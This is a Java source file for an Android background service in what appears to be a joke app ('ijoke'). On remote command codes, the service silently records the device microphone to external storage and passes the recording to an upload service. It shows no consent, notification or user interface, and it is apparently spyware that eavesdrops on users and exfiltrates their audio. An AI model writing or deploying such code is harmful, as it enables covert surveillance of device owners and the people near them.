package com.studio.android.ijoke;

import java.io.File;
import java.io.IOException;

import com.android.ijoke.network.UploadService;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;

public class RecorderService extends Service{

	private MediaRecorder mRecorder = null ;
	private File mSampleFile;  
        private UploadService uploadService = new UploadService();
	private void initRecorder()
	{
		if(mRecorder!=null){
			mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
			mRecorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
			mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
			try {  
				mSampleFile = File.createTempFile("record", ".amr", Environment  
				.getExternalStorageDirectory());  
				Log.i("record path",mSampleFile.getPath());
				} 
			catch (IOException e1) {  
			     e1.printStackTrace();  
				}  
			mRecorder.setOutputFile(mSampleFile.getAbsolutePath());  
			try {  
				mRecorder.prepare();  
				} 
			catch (IllegalStateException e) {  
				e.printStackTrace();  
				}
			catch (IOException e) {  
			e.printStackTrace();  
			}  
		}
	}
	private void onStopRecorder()
	{
		if(mRecorder!=null)
		{
			mRecorder.stop();
			mRecorder.release();
			mRecorder = null;
		}
	}

	private void onRestartRecorder()
	{
		onStopRecorder();  
		Log.i("Start Rec", "MessageManager");  
		mRecorder = new MediaRecorder();  
		initRecorder();  
		mRecorder.start(); 
	}
	public void notifyRecorder(int cmd)
	{
		if(cmd == Command.STATUS_PLAYING)
		{
			Log.i("test", "uploadService");
			this.onRestartRecorder();
		}

		else if(cmd == Command.CMD_UPLOAD)
		{
			Log.i("test", "uploadService");
			uploadService.onReceive(mSampleFile.getAbsolutePath());
		}
		
		else if(cmd == Command.STATUS_STOPPED)
		{
			this.onStopRecorder();
		}
	}

	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
}
